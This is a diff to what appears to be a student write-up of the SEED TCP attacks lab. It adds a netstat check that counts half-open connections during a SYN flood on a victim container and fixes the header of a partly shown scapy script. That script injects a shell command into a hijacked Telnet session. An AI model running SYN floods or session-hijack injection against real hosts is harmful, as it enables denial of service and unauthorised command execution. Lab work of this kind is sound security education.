@@ -51,6 +51,11 @@ seed@VM:~/.../volumes$ docker exec victim-10.9.0.5 ip tcp_metrics flush
 Reducing the backlog to 80 was enough to saturate all the available spots.
 Now, during the attack execution, we can see that the number of incomplete connections now is `61` and the Telnet connections now fails (stays on `Trying 10.9.0.5...`, eventually goes in timeout).
 
+```bash
+seed@VM:~/.../volumes$ docker exec -it victim-10.9.0.5 netstat -tna | grep SYN_RECV | wc -l
+61
+```
+
 # TASK 1.2
 
 We reset the backlog size to its original value (`256`, then flush just to be sure):
@@ -201,7 +206,7 @@ First, we want to get the **Sequence Number**: we look for the last packet sent 
 Then we need to find the **Acknowledgment Number**: we look for the last packet in that same direction, but with flag `ACK`, and we get the ACK number.
 
 ```py
- #!/usr/bin/env python3
+#!/usr/bin/env python3
 from scapy.all import *
 
 data = "echo nano > /home/seed/hacked.txt \r\n"
